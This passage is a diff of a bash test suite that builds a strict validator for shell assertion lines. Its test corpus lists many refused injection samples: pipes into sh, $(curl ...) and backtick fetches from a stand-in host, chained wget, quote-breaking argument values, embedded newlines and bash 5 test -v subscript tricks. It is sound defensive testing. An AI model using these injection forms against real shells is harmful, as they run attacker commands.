@@ -1151,26 +1151,34 @@ edck ctx "$work/rt-empty.json"
 CASE="context limit (documented): a harmless ruled echo moved above its heredoc opener keeps its identity, so it is no addition (exit 0); it still only echoes"
 check test "$rc" -eq 0
 # --- REQ-SUP-001-AC16, the second allowed row form (advisor, Oct 10): a HARNESS ASSERTION LINE. The test-only function t with a quoted rule and a quoted
-# title and ONE bash -c body; the body uses only grep, test or [ ], !, &&, || and cat of a file; the only substitutions are $(grep -c ...) and $(cat <file>);
-# pipes go only into grep; no redirection, no eval or source, no variable or quoted word as the command word. harness_form.py decides it (exit 0 'harness
-# assertion', exit 1 'refused: why'); the committed-row check below uses the same file. Each refused variant is its own case.
+# title, ONE SINGLE-QUOTED bash -c body, then _ and only quoted path arguments "$NAME" or "$NAME/path" with NAME in work, CALLS (Codex R1: a double-quoted
+# body let the outer shell splice a variable's value into the code). Inside the body: grep, test or [ ], !, &&, ||, cat of one file and exit <digit>; the
+# paths only as whole "$1".."$9"; the only substitutions are "$(grep -c ... "$N")" and "$(cat "$N")"; no other $ or backtick anywhere; test and [ take only
+# -f -s -e -d -r, = and !=, and the count comparisons between digits and $(grep -c ...) (no -v, -R or arithmetic on a name: bash 5 evaluates $(...)
+# there, Sonnet R1); a character outside space, tab and printable ASCII refuses the line (Sonnet R1: a newline); pipes go only into grep; no redirection,
+# no eval or source, no variable or quoted word as the command word. harness_form.py decides it (exit 0 'harness assertion', exit 1 'refused: why';
+# --file F reads the line from a file); the committed-row check below uses the same file. Each refused variant is its own case, and the runtime proof
+# below executes the whole corpus with plain and hostile argument values.
 cat >"$work/harness_form.py" <<'PY'
 import re, sys
 VOCAB = {"grep", "test", "[", "cat"}
+UNARY = {"-f", "-s", "-e", "-d", "-r"}                     # file tests on a path; -v, -R, -n, -z, -a, -o and every other operator are refused
+STRING = {"=", "!="}
+ARITH = {"-eq", "-ne", "-lt", "-le", "-gt", "-ge"}         # only between plain digits and "$(grep -c ...)" (a count): never a name or expression
+NAMES = ("work", "CALLS")                                  # the only variables an argument after the body may name (what the committed lines need)
+GSUB, CSUB, POSW = "\x01G", "\x01C", "\x01P"               # placeholders: a control character can never come from an accepted line
 class Refused(Exception): pass
-def outer(s, where):                                       # what bash makes of a double-quoted outer argument; a substitution it would RUN is refused
-    out, i = [], 0
+def outer(s, where):                                       # the double-quoted rule or title: an argument of t, never parsed again; a substitution is refused
+    i = 0
     while i < len(s):
-        c = s[i]
-        if c == "\\" and s[i + 1:i + 2] in ("$", "`", '"', "\\"):
-            out.append(s[i + 1]); i += 2; continue
-        if c == "`" or (c == "$" and s[i + 1:i + 2] == "("):
-            raise Refused(f"a substitution the outer shell runs, in the {where}")
-        out.append(c); i += 1
-    return "".join(out)
-ARG = r"(?:'[^']*'|[A-Za-z0-9_./=^-]+)"
-SUBS = (re.compile(r'"\$\(grep -c(?: +' + ARG + r')+\)"'), re.compile(r'"\$\(cat +' + ARG + r'\)"'))
-def words(b):                                              # quote-aware: [("op", x)] or [("word", text, quoted)]; anything outside the vocabulary of forms refuses
+        if s[i] == "\\": i += 2; continue
+        if s[i] == "`" or (s[i] == "$" and s[i + 1:i + 2] == "("): raise Refused(f"a substitution the outer shell runs, in the {where}")
+        i += 1
+QW = r'"(?:[^"$`\\]|\\[^"$`\\])*"'                         # a double-quoted word with no $, backtick, escaped quote or escaped backslash
+POS = r'"\$[1-9]"'
+SUBS = ((re.compile(r'"\$\(grep -c(?: +(?:' + QW + r'|[A-Za-z0-9_./=^-]+))* +' + POS + r'\)"'), '"' + GSUB + '"'),
+        (re.compile(r'"\$\(cat +' + POS + r'\)"'), '"' + CSUB + '"'))
+def words(b, nargs):                                       # quote-aware: [("op", x)] or [("word", text, quoted)]; anything outside the vocabulary of forms refuses
     out, i, n = [], 0, len(b)
     while i < n:
         c = b[i]
@@ -1181,29 +1189,53 @@ def words(b):                                              # quote-aware: [("op"
         w, quoted = [], False
         while i < n and b[i] not in " \t|;&<>()":
             c = b[i]
-            if c == "'":
-                j = b.find("'", i + 1)
-                if j < 0: raise Refused("an unterminated quote in the body")
-                w.append(b[i + 1:j]); quoted = True; i = j + 1
-            elif c == '"':
+            if c == '"':
                 j = i + 1
                 while j < n and b[j] != '"':
-                    if b[j] in "\\`" or (b[j] == "$" and b[j + 1:j + 2] == "("): raise Refused("a substitution or escape inside a double-quoted body word")
+                    if b[j] == "\\":
+                        if b[j + 1:j + 2] in ('"', "$", "`", "\\", ""): raise Refused("an escaped quote, dollar, backtick or backslash inside a double-quoted body word")
+                        j += 2; continue
                     j += 1
                 if j >= n: raise Refused("an unterminated quote in the body")
-                w.append(b[i + 1:j]); quoted = True; i = j + 1
-            elif c in "\\`": raise Refused("a backslash or backtick in the body")
-            elif c == "$" and b[i + 1:i + 2] in ("(", "{"): raise Refused("a substitution in the body")
+                t = b[i + 1:j]
+                if re.fullmatch(r"\$[1-9]", t):
+                    if int(t[1]) > nargs: raise Refused(f"{t} names no argument after the body")
+                    if w or (j + 1 < n and b[j + 1] not in " \t|;&<>()"): raise Refused("a positional parameter inside a longer word")
+                    t = POSW
+                elif "$" in t or "`" in t: raise Refused("a $ or backtick inside a double-quoted body word (only a whole \"$1\"..\"$9\")")
+                w.append(t); quoted = True; i = j + 1
+            elif c in "\\`$'": raise Refused(f"an unquoted {c!r} in the body")
             else: w.append(c); i += 1
         out.append(("word", "".join(w), quoted))
     return out
+def test_args(args):                                       # test / [ operands: [!]... then OP X (file test) or X OP Y (string or count comparison)
+    while args and args[0][1] == "!" and not args[0][2]: args = args[1:]
+    if len(args) == 2 and not args[0][2] and args[0][1] in UNARY: return
+    if len(args) == 3 and not args[1][2] and args[1][1] in STRING: return
+    if len(args) == 3 and not args[1][2] and args[1][1] in ARITH:
+        for a in (args[0], args[2]):
+            if not ((not a[2] and re.fullmatch(r"[0-9]+", a[1])) or (a[2] and a[1] == GSUB)):
+                raise Refused(f"an arithmetic comparison on {a[1]!r} (only plain digits or \"$(grep -c ...)\")")
+        return
+    raise Refused("test or [ outside the allowed forms: OP PATH with OP in -f -s -e -d -r, or X = Y, X != Y, or a count comparison (-eq -ne -lt -le -gt -ge)")
 def judge(line):
-    m = re.fullmatch(r't "((?:[^"\\]|\\.)*)" "((?:[^"\\]|\\.)*)" bash -c "((?:[^"\\]|\\.)*)"', line)
-    if not m: raise Refused("not the form: t \"rule\" \"title\" bash -c \"body\" and nothing after")
-    outer(m.group(1), "rule"); outer(m.group(2), "title"); body = outer(m.group(3), "body")
-    for rx in SUBS: body = rx.sub('"SUB"', body)           # the two allowed substitutions, whole and double-quoted; any other is refused by words()
+    bad = [c for c in line if not (c == "\t" or " " <= c <= "~")]
+    if bad: raise Refused(f"a character outside space, tab and printable ASCII ({bad[0]!r}): bash may read the line differently")
+    m = re.fullmatch(r'\s*t "((?:[^"\\]|\\.)*)" "((?:[^"\\]|\\.)*)" bash -c \'([^\']*)\' _((?: +"[^"]*")*)', line)
+    if not m: raise Refused("not the form: t \"rule\" \"title\" bash -c 'body' _ \"$NAME/path\"... (a single-quoted body, then _ and quoted path arguments, nothing else)")
+    outer(m.group(1), "rule"); outer(m.group(2), "title")
+    args = re.findall(r' +("[^"]*")', m.group(4))
+    for a in args:
+        if not re.fullmatch(r'"\$(?:' + "|".join(NAMES) + r')(?:/[A-Za-z0-9_.-]+)*"', a):
+            raise Refused(f"the argument {a} is not \"$NAME\" or \"$NAME/path\" with NAME in {', '.join(NAMES)}")
+    body = m.group(3)
+    for rx, ph in SUBS: body = rx.sub(ph, body)            # the two allowed substitutions, whole and double-quoted, on a positional argument
+    if re.search(r"\$\(|\$\{|`", body): raise Refused("a $( ${ $(( or backtick in the body outside the two allowed substitutions")
+    for rx in (r'\$([1-9])',):
+        for d in re.findall(rx, m.group(3)):
+            if int(d) > len(args): raise Refused(f"${d} names no argument after the body")
     cmds, cur, ops = [], [], []
-    for t in words(body):
+    for t in words(body, len(args)):
         if t[0] == "op": cmds.append(cur); ops.append(t[1]); cur = []
         else: cur.append(t)
     cmds.append(cur)
@@ -1217,72 +1249,263 @@ def judge(line):
             continue
         if quoted or word not in VOCAB: raise Refused(f"the command word {word!r} is not grep, test, [, cat or exit <digit> (unquoted)")
         if k and ops[k - 1] == "|" and word != "grep": raise Refused(f"a pipe into {word!r} (pipes go only into grep)")
-        if word == "[" and c[-1][1] != "]": raise Refused("[ without its closing ]")
+        if word == "[" and (c[-1][1] != "]" or c[-1][2]): raise Refused("[ without its closing ]")
+        if word == "test": test_args(c[1:])
+        if word == "[": test_args(c[1:-1])
         if word == "cat" and (len(c) != 2 or c[1][1].startswith("-")): raise Refused("cat of anything but one file")
 try:
-    judge(sys.argv[1])
+    judge(open(sys.argv[2], encoding="utf-8", errors="surrogateescape", newline="").read() if sys.argv[1] == "--file" else sys.argv[1])
 except Refused as e:
     print("refused: " + str(e)); sys.exit(1)
 print("harness assertion: runs nothing but grep, test, cat and exit <digit>"); sys.exit(0)
 PY
 hf() { rc=0; python3 "$work/harness_form.py" "$1" >"$work/hf.out" 2>&1 || rc=$?; }
+hff() { rc=0; python3 "$work/harness_form.py" --file "$1" >"$work/hf.out" 2>&1 || rc=$?; }
+cat >"$work/hf-refused.tsv" <<'EOF'
+a pipe into sh	t "r" "x" bash -c 'grep -q a "$1" | sh' _ "$CALLS"
+a pipe into bash	t "r" "x" bash -c 'cat "$1" | bash' _ "$CALLS"
+an output redirection >	t "r" "x" bash -c 'grep a "$1" > out' _ "$CALLS"
+an output redirection >>	t "r" "x" bash -c 'grep a "$1" >> out' _ "$CALLS"
+an input redirection <	t "r" "x" bash -c 'grep a < "$1"' _ "$CALLS"
+$(curl ...) in the body	t "r" "x" bash -c 'test "$(curl -s https://e.example/x)" = 1' _
+$(...) of another command in the body	t "r" "x" bash -c 'test "$(ls)" = 1' _
+an unquoted $(grep -c ...) in the body	t "r" "x" bash -c 'test $(grep -c a "$1") -ge 1' _ "$CALLS"
+a pipe inside $(grep -c ...)	t "r" "x" bash -c 'test "$(grep -c a "$1" | sh)" -ge 1' _ "$CALLS"
+a substitution inside $(cat ...)	t "r" "x" bash -c 'test "$(cat $(curl -s https://e.example/x))" = 1' _
+$(cat ...) of a literal path, not a positional argument	t "r" "x" bash -c 'test "$(cat f)" = 1' _
+$(grep -c ...) on a literal path, not a positional argument	t "r" "x" bash -c 'test "$(grep -c a f)" -ge 1' _
+a process substitution in the body	t "r" "x" bash -c 'grep a <(cat "$1")' _ "$CALLS"
+a substitution the outer shell runs, in the title	t "r" "x $(curl -s https://e.example/x)" bash -c 'grep a "$1"' _ "$CALLS"
+a substitution the outer shell runs, in the rule label	t "r $(curl -s https://e.example/x)" "x" bash -c 'grep a "$1"' _ "$CALLS"
+a substitution the outer shell runs, in an argument	t "r" "x" bash -c 'grep a "$1"' _ "$(curl -s https://e.example/x)"
+backticks in the body	t "r" "x" bash -c 'test "`curl -s https://e.example/x`" = 1' _
+backticks in the title	t "r" "x `curl -s https://e.example/x`" bash -c 'grep a "$1"' _ "$CALLS"
+a command word outside the vocabulary (curl)	t "r" "x" bash -c 'curl -s https://e.example/x' _
+a quoted command word	t "r" "x" bash -c '"grep" a "$1"' _ "$CALLS"
+a variable as the command word	t "r" "x" bash -c '$G a "$1"' _ "$CALLS"
+a positional argument as the command word	t "r" "x" bash -c '"$1" a' _ "$CALLS"
+eval	t "r" "x" bash -c 'eval "grep a f"' _
+source	t "r" "x" bash -c 'source "$1"' _ "$CALLS"
+a second bash -c	t "r" "x" bash -c 'bash -c "grep a f"' _
+a ;-separated extra command (wget)	t "r" "x" bash -c 'grep a "$1"; wget https://e.example/x' _ "$CALLS"
+exit with a variable status	t "r" "x" bash -c 'grep a "$1" && exit $x' _ "$CALLS"
+exit with a positional status	t "r" "x" bash -c 'grep a "$1" && exit "$1"' _ "$CALLS"
+exit with no status	t "r" "x" bash -c 'grep a "$1" && exit' _ "$CALLS"
+exit with two arguments	t "r" "x" bash -c 'grep a "$1" && exit 1 2' _ "$CALLS"
+exit with a negative status	t "r" "x" bash -c 'grep a "$1" && exit -1' _ "$CALLS"
+exit with two digits	t "r" "x" bash -c 'grep a "$1" && exit 10' _ "$CALLS"
+exit with a quoted status	t "r" "x" bash -c 'grep a "$1" && exit "1"' _ "$CALLS"
+a quoted exit	t "r" "x" bash -c 'grep a "$1" && "exit" 1' _ "$CALLS"
+a background &	t "r" "x" bash -c 'grep a "$1" & curl https://e.example/x' _ "$CALLS"
+a subshell	t "r" "x" bash -c '(curl https://e.example/x)' _
+cat with an option	t "r" "x" bash -c 'cat -v "$1"' _ "$CALLS"
+cat of two files	t "r" "x" bash -c 'cat "$1" "$1"' _ "$CALLS"
+a pipe into anything but grep (tee)	t "r" "x" bash -c 'cat "$1" | tee g' _ "$CALLS"
+not the t function	run "r" "x" bash -c 'grep a "$1"' _ "$CALLS"
+an unquoted title	t "r" x bash -c 'grep a "$1"' _ "$CALLS"
+no rule label	t "x" bash -c 'grep a "$1"' _ "$CALLS"
+an empty command between operators	t "r" "x" bash -c 'grep a "$1" && && grep b "$1"' _ "$CALLS"
+Codex R1 reproduction: a DOUBLE-quoted body with an outer variable (its value is spliced into the code)	t "r" "x" bash -c "grep -q a '$CALLS'"
+a double-quoted body even with no variable	t "r" "x" bash -c "grep -q a f" _
+no _ after the body	t "r" "x" bash -c 'grep a "$1"' "$CALLS"
+a $0 other than _	t "r" "x" bash -c 'grep a "$1"' x "$CALLS"
+an unquoted word after the body	t "r" "x" bash -c 'grep a "$1"' _ curl
+a second body after the arguments	t "r" "x" bash -c 'grep a "$1"' _ "$CALLS" bash -c 'curl https://e.example/x'
+an argument variable outside the allowlist	t "r" "x" bash -c 'grep a "$1"' _ "$HOME"
+an argument with two variables	t "r" "x" bash -c 'grep a "$1"' _ "$work$CALLS"
+an argument written ${work}	t "r" "x" bash -c 'grep a "$1"' _ "${work}/rc"
+an argument with a variable in the path	t "r" "x" bash -c 'grep a "$1"' _ "$work/$x"
+an argument with a glob	t "r" "x" bash -c 'grep a "$1"' _ "$work/*"
+a single-quoted argument	t "r" "x" bash -c 'grep a "$1"' _ '$CALLS'
+an unquoted argument	t "r" "x" bash -c 'grep a "$1"' _ $CALLS
+a literal argument	t "r" "x" bash -c 'grep a "$1"' _ "f"
+a positional beyond the arguments	t "r" "x" bash -c 'grep a "$2"' _ "$CALLS"
+an unquoted positional	t "r" "x" bash -c 'grep a $1' _ "$CALLS"
+"$@" in the body	t "r" "x" bash -c 'grep a "$@"' _ "$CALLS"
+"${1}" in the body	t "r" "x" bash -c 'grep a "${1}"' _ "$CALLS"
+"$10" in the body	t "r" "x" bash -c 'grep a "$10"' _ "$CALLS"
+a positional inside a longer word	t "r" "x" bash -c 'grep a "$1/x"' _ "$CALLS"
+a positional glued to another word	t "r" "x" bash -c 'grep a "$1"x' _ "$CALLS"
+an inner variable in a double-quoted word	t "r" "x" bash -c 'grep "$HOME" "$1"' _ "$CALLS"
+an escaped quote in a double-quoted word	t "r" "x" bash -c 'grep "a\"b" "$1"' _ "$CALLS"
+an escaped dollar in a double-quoted word	t "r" "x" bash -c 'grep "a\$b" "$1"' _ "$CALLS"
+an unquoted backslash	t "r" "x" bash -c 'grep a\ b "$1"' _ "$CALLS"
+Sonnet R1 reproduction 2 (new form): test -v with a literal $(...) array subscript (bash 5 evaluates it)	t "r" "x" bash -c 'test -v "a[\$(curl -s https://e.example/x)]"' _
+test -v "a[$(touch X)]" (the substitution runs at expansion)	t "r" "x" bash -c 'test -v "a[$(touch X)]"' _
+test -v on a positional argument (its value would be the subscript)	t "r" "x" bash -c 'test -v "$1"' _ "$CALLS"
+[ -v "x[$(cmd)]" ]	t "r" "x" bash -c '[ -v "x[$(cmd)]" ]' _
+[ -R "x[$(cmd)]" ]	t "r" "x" bash -c '[ -R "x[$(cmd)]" ]' _
+-eq with an array-subscript operand	t "r" "x" bash -c '[ "$(cat "$1")" -eq "a[$(cmd)]" ]' _ "$CALLS"
+-ge with a positional operand	t "r" "x" bash -c 'test "$1" -ge 0' _ "$CALLS"
+a backtick inside a double-quoted pattern	t "r" "x" bash -c 'grep "a`curl -s https://e.example/x`" "$1"' _ "$CALLS"
+${x} in a double-quoted pattern	t "r" "x" bash -c 'grep "${x}" "$1"' _ "$CALLS"
+${x} unquoted	t "r" "x" bash -c 'grep ${x} "$1"' _ "$CALLS"
+$((1+1))	t "r" "x" bash -c 'test $((1+1)) = 2' _
+$( inside a grep -c pattern	t "r" "x" bash -c 'test "$(grep -c "a$(curl -s https://e.example/x)" "$1")" -ge 1' _ "$CALLS"
+an arithmetic comparison on $(cat ...) (the file's text would be the expression)	t "r" "x" bash -c 'test "$(cat "$1")" -eq 0' _ "$work/evil"
+an arithmetic comparison on a quoted word	t "r" "x" bash -c 'test "a" -eq 0' _
+an arithmetic comparison on a bare word (a variable name)	t "r" "x" bash -c 'test a -eq 0' _
+an arithmetic comparison on an inner variable	t "r" "x" bash -c 'test $x -eq 0' _
+test -n	t "r" "x" bash -c 'test -n "$1"' _ "$CALLS"
+test -z	t "r" "x" bash -c '[ -z "$1" ]' _ "$CALLS"
+test -a (and)	t "r" "x" bash -c 'test -f "$1" -a -f "$1"' _ "$CALLS"
+test -o (an option name)	t "r" "x" bash -c 'test -o errexit' _
+test with one operand	t "r" "x" bash -c 'test a' _
+test with four operands	t "r" "x" bash -c 'test a = b c' _
+an operator outside the set (-nt)	t "r" "x" bash -c 'test "$1" -nt "$1"' _ "$CALLS"
+a quoted operator	t "r" "x" bash -c 'test a "=" b' _
+a quoted unary operator	t "r" "x" bash -c 'test "-f" "$1"' _ "$CALLS"
+EOF
 while IFS=$'\t' read -r what line; do
   hf "$line"
   CASE="AC16 harness form: refused ($what): exit 1, says refused"
   check test "$rc" -eq 1; check grep -q '^refused: ' "$work/hf.out"
-done <<'EOF'
-a pipe into sh	t "r" "x" bash -c "grep -q a 'f' | sh"
-a pipe into bash	t "r" "x" bash -c "cat 'f' | bash"
-an output redirection >	t "r" "x" bash -c "grep a 'f' > 'out'"
-an output redirection >>	t "r" "x" bash -c "grep a 'f' >> 'out'"
-an input redirection <	t "r" "x" bash -c "grep a < 'f'"
-$(curl ...) in the body	t "r" "x" bash -c "test \"\$(curl -s https://e.example/x)\" = 1"
-$(...) of another command in the body	t "r" "x" bash -c "test \"\$(ls)\" = 1"
-an unquoted $(grep -c ...) in the body	t "r" "x" bash -c "test \$(grep -c a 'f') -ge 1"
-a pipe inside $(grep -c ...)	t "r" "x" bash -c "test \"\$(grep -c a 'f' | sh)\" -ge 1"
-a substitution inside $(cat ...)	t "r" "x" bash -c "test \"\$(cat \$(curl -s https://e.example/x))\" = 1"
-a process substitution in the body	t "r" "x" bash -c "grep a <(cat 'f')"
-a substitution the outer shell runs, in the title	t "r" "x $(curl -s https://e.example/x)" bash -c "grep a 'f'"
-a substitution the outer shell runs, in the body	t "r" "x" bash -c "grep a $(curl -s https://e.example/x)"
-backticks in the body	t "r" "x" bash -c "test \"\`curl -s https://e.example/x\`\" = 1"
-backticks in the title	t "r" "x `curl -s https://e.example/x`" bash -c "grep a 'f'"
-a command word outside the vocabulary (curl)	t "r" "x" bash -c "curl -s https://e.example/x"
-a quoted command word	t "r" "x" bash -c "'grep' a 'f'"
-a variable as the command word	t "r" "x" bash -c "\$G a 'f'"
-an outer variable as the command word	t "r" "x" bash -c "$G a 'f'"
-eval	t "r" "x" bash -c "eval 'grep a f'"
-source	t "r" "x" bash -c "source 'f'"
-a second bash -c	t "r" "x" bash -c "bash -c 'grep a f'"
-a ;-separated extra command (wget)	t "r" "x" bash -c "grep a 'f'; wget https://e.example/x"
-exit with a variable status	t "r" "x" bash -c "grep a 'f' && exit \$x"
-exit with an outer variable status	t "r" "x" bash -c "grep a 'f' && exit $x"
-exit with no status	t "r" "x" bash -c "grep a 'f' && exit"
-exit with two arguments	t "r" "x" bash -c "grep a 'f' && exit 1 2"
-exit with a negative status	t "r" "x" bash -c "grep a 'f' && exit -1"
-exit with two digits	t "r" "x" bash -c "grep a 'f' && exit 10"
-exit with a quoted status	t "r" "x" bash -c "grep a 'f' && exit '1'"
-a quoted exit	t "r" "x" bash -c "grep a 'f' && 'exit' 1"
-a background &	t "r" "x" bash -c "grep a 'f' & curl https://e.example/x"
-a subshell	t "r" "x" bash -c "(curl https://e.example/x)"
-cat with an option	t "r" "x" bash -c "cat -v 'f'"
-cat of two files	t "r" "x" bash -c "cat 'f' 'g'"
-a pipe into anything but grep (tee)	t "r" "x" bash -c "cat 'f' | tee 'g'"
-extra arguments after the body	t "r" "x" bash -c "grep a 'f'" curl
-a second body	t "r" "x" bash -c "grep a 'f'" bash -c "curl https://e.example/x"
-not the t function	run "r" "x" bash -c "grep a 'f'"
-an unquoted title	t "r" x bash -c "grep a 'f'"
-no rule label	t "x" bash -c "grep a 'f'"
-an empty command between operators	t "r" "x" bash -c "grep a 'f' && && grep b 'f'"
+done <"$work/hf-refused.tsv"
+# characters bash reads differently from the parser: anything outside space, tab and printable ASCII (Sonnet R1 reproduction 1: a literal newline in the body)
+python3 - "$work" <<'PY'
+import sys
+w = sys.argv[1]
+B = 't "r" "x" bash -c \'grep a "$1"\' _ "$CALLS"'
+cases = [
+    ("Sonnet R1 reproduction 1: a literal newline in the body (bash runs the text after it as a second command)", 't "r" "x" bash -c \'grep a "$1"\ncurl -s https://e.example/x\' _ "$CALLS"'),
+    ("a literal newline in the title", B.replace('"x"', '"x\ny"')),
+    ("a literal newline in the rule label", B.replace('"r"', '"r\ns"')),
+    ("a literal newline after the arguments", B + "\ncurl -s https://e.example/x"),
+    ("a carriage return in the body", 't "r" "x" bash -c \'grep a "$1"\rcurl -s https://e.example/x\' _ "$CALLS"'),
+    ("a control character (0x01) in the body", B.replace("grep a", "grep a\x01")),
+    ("an escape (0x1b) in the title", B.replace('"x"', '"x\x1b[0m"')),
+    ("a vertical tab in the body", B.replace("grep a", "grep a\x0bcurl")),
+    ("a form feed in the body", B.replace("grep a", "grep a\x0c")),
+    ("DEL (0x7f) in the body", B.replace("grep a", "grep a\x7f")),
+    ("a non-ASCII letter in the title", B.replace('"x"', '"café"')),
+    ("a non-breaking space in the body", B.replace("grep a", "grep a")),
+]
+for i, (what, line) in enumerate(cases):
+    open("%s/ctl-%02d.txt" % (w, i), "w", encoding="utf-8", newline="").write(line)
+    open("%s/ctl-%02d.what" % (w, i), "w").write(what)
+PY
+for f in "$work"/ctl-*.txt; do
+  hff "$f"
+  CASE="AC16 harness form: refused ($(cat "${f%.txt}.what")): exit 1, says refused"
+  check test "$rc" -eq 1; check grep -q '^refused: ' "$work/hf.out"
+done
+cat >"$work/hf-accepted.tsv" <<'EOF'
+the whole vocabulary	t "r" "x" bash -c 'grep -q a "$1" && ! grep -E "b|c" "$1" || test "$(grep -c a "$1")" -ge 3; [ "$(cat "$1")" = 2 ] | grep -q .' _ "$CALLS"
+exit with one literal digit	t "r" "x" bash -c 'grep a "$1" | grep -vq b && exit 1; exit 0' _ "$CALLS"
+the file tests -f -s -e -d -r and !	t "r" "x" bash -c 'test -f "$1" && [ -s "$1" ] && test -e "$1" && ! test -d "$1" && test ! -d "$1" && [ -r "$1" ]' _ "$CALLS"
+string = and != on $(cat ...)	t "r" "x" bash -c 'test "$(cat "$1")" != b && [ "$(cat "$2")" = a ]' _ "$work/rc" "$CALLS"
+arithmetic on digits and on $(grep -c ...)	t "r" "x" bash -c 'test "$(grep -c a "$1")" -eq 1 && [ 3 -ne 4 ] && test 1 -lt 2 && test 2 -le 2 && test 3 -gt 2' _ "$CALLS"
+an escaped dot in a pattern	t "r" "x" bash -c 'grep -Eq "a\.b" "$1"' _ "$CALLS"
+no argument after _	t "r" "x" bash -c 'test 1 -eq 1' _
 EOF
 while IFS=$'\t' read -r what line; do
   hf "$line"
   CASE="AC16 harness form: accepted ($what): exit 0"
   check test "$rc" -eq 0; check grep -q '^harness assertion' "$work/hf.out"
-done <<'EOF'
-the whole vocabulary	t "r" "x" bash -c "grep -q a 'f' && ! grep -E 'b|c' 'f' || test \"\$(grep -c a 'f')\" -ge 3; [ \"\$(cat 'f')\" = 2 ] | grep -q ."
-exit with one literal digit	t "r" "x" bash -c "grep a 'f' | grep -vq b && exit 1; exit 0"
-the P3 line (bin/refresh-inputs-test.sh)	t "rule 32" "refresh: the url '$u' (a character outside the plain set) is refused (exit 2), never fetched" bash -c "test \"\$(cat '$work/rc')\" = 2 && ! grep -E '^curl .*tzdata' '$CALLS'"
+done <"$work/hf-accepted.tsv"
+# the distinct lines of the committed rows for bin/refresh-inputs-test.sh (the final P3 tree): the harness lines among them must be accepted, and all of them run in the runtime proof
+cat >"$work/hf-real.txt" <<'EOF'
+# ---- P3 review round 2 (Sonnet extras): pointer, certified.txt shape, index tied to the locks, datahash, ranges, curl flags, openssl -----------------------------
+# the live melange resolution moves busybox to 9.9.9-r0: a copy of the live melange lock with that version, and the new apk in the live archive/curl dir
+# url characters, curl flags and caps
+t "rule 32" "refresh compares the live Wolfi key to the archived one on every run (even when nothing changed)" bash -c 'test "$(cat "$1")" = 0 && grep -Eq "^curl .*https://packages\.wolfi\.dev/os/.*wolfi-signing\.rsa\.pub" "$2"' _ "$work/rc" "$CALLS"
+t "rule 32" "refresh: every curl call is HTTPS-only with TLS 1.2 or newer (--proto =https --tlsv1.2)" bash -c 'grep "^curl " "$1" | grep -vq -- "--proto =https --tlsv1.2" && exit 1; test "$(grep -c "^curl " "$1")" -ge 3' _ "$CALLS"
+t "rule 32" "refresh: every package and index download is globoff (-g), size-capped (--max-filesize) and time-capped (--max-time)" bash -c 'grep "^curl " "$1" | grep -E "tzdata|APKINDEX" | grep -v -E -- "(-g|--globoff).*--max-filesize|--max-filesize.*(-g|--globoff)" | grep -q . && exit 1; grep "^curl " "$1" | grep -E "tzdata|APKINDEX" | grep -q -- "--max-time"' _ "$CALLS"
+t "rule 32" "refresh: the url '$u' (a character outside the plain set) is refused (exit 2), never fetched" bash -c 'test "$(cat "$1")" = 2 && ! grep -E "^curl .*tzdata" "$2"' _ "$work/rc" "$CALLS"
 EOF
+while IFS= read -r line; do
+  case "$line" in t\ *) hf "$line"; CASE="AC16 harness form: accepted (the committed row line ${line:0:60}...): exit 0"; check test "$rc" -eq 0;; esac
+done <"$work/hf-real.txt"
+CASE="AC16 harness form: the real-line list is exactly the distinct lines of the committed rows for bin/refresh-inputs-test.sh (by whole-line hash)"
+check python3 - "$work/hf-real.txt" "$root/.github/supply-chain-exceptions.json" <<'PY'
+import hashlib, json, sys
+H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()[:16]
+real = {H(" ".join(l.split())) for l in open(sys.argv[1]).read().split("\n") if l}
+rows = {r["line"] for r in json.load(open(sys.argv[2]))["unmeasured_text"] if r["file"] == "bin/refresh-inputs-test.sh"}
+assert real == rows, (sorted(real ^ rows))
+PY
+# --- RUNTIME proof (Sonnet R1): every corpus line is EXECUTED under bash 5 (the version whose test -v / -R / arithmetic operands evaluate $(...) inside
+# single quotes), with a stub directory first on PATH whose curl, wget, touch, cmd and ls only write a marker file; the inner bash is the same bash 5. Then:
+# every line that wrote the marker was refused by the parser, the planted reproductions did write it (the harness detects a run), and every accepted line
+# (the corpus and the committed real lines, with $work and $CALLS pointing at temp files) ran and wrote nothing.
+cat >"$work/hf_run.py" <<'PY'
+import json, os, subprocess, sys, tempfile
+hfpy, w = sys.argv[1], sys.argv[2]
+def bash5():
+    for d in os.environ.get("PATH", "").split(os.pathsep):
+        p = os.path.join(d, "bash")
+        if d and os.access(p, os.X_OK):
+            r = subprocess.run([p, "-c", "echo ${BASH_VERSINFO[0]}"], capture_output=True, text=True, stdin=subprocess.DEVNULL)
+            if r.returncode == 0 and r.stdout.strip().isdigit() and int(r.stdout) >= 5:
+                return p
+    return None
+b5 = bash5()
+corpus = []
+for kind, name in (("refused", "hf-refused.tsv"), ("accepted", "hf-accepted.tsv")):
+    for l in open(os.path.join(w, name)).read().split("\n"):
+        if l:
+            what, line = l.split("\t", 1); corpus.append((kind, what, line))
+for l in open(os.path.join(w, "hf-real.txt")).read().split("\n"):
+    if l:
+        corpus.append(("real", l[:60], l))
+for f in sorted(os.listdir(w)):
+    if f.startswith("ctl-") and f.endswith(".txt"):
+        corpus.append(("refused", open(os.path.join(w, f[:-4] + ".what")).read(), open(os.path.join(w, f), encoding="utf-8", newline="").read()))
+# argument values that would add a command if the outer shell spliced them into code (Codex R1): the accepted form passes them as data only
+HOSTILE = ["x'; curl -s https://e.example/x; #", 'x"; curl -s https://e.example/x; #', "$(curl -s https://e.example/x)", "a[$(curl -s https://e.example/x)]",
+           "`curl -s https://e.example/x`"]
+out = {"bash5": b5, "hostile": HOSTILE, "lines": []}
+if b5:
+    for kind, what, line in corpus:
+        d = tempfile.mkdtemp(dir=w, prefix="hfrun.")
+        st = os.path.join(d, "stubs"); os.mkdir(st)
+        mark = os.path.join(d, "marker")
+        for n in ("curl", "wget", "touch", "cmd", "ls"):
+            p = os.path.join(st, n); open(p, "w").write("#!%s\necho \"$0 $*\" >>\"$MARK\"\n" % b5); os.chmod(p, 0o755)
+        p = os.path.join(st, "bash"); open(p, "w").write("#!%s\nexec %s \"$@\"\n" % (b5, b5)); os.chmod(p, 0o755)
+        for n, t in (("f", "a\n"), ("g", "b\n"), ("rc", "0\n"), ("calls", "curl --proto =https --tlsv1.2 -g --max-filesize 1 --max-time 1 x\n"),
+                     ("evil", "a[$(curl -s https://e.example/x)]\n")):
+            open(os.path.join(d, n), "w").write(t)
+        def run(work, calls, u):
+            if os.path.exists(mark): os.remove(mark)
+            env = {"PATH": st + os.pathsep + os.environ["PATH"], "HOME": d, "MARK": mark, "work": work, "CALLS": calls, "u": u, "LC_ALL": "C"}
+            try:
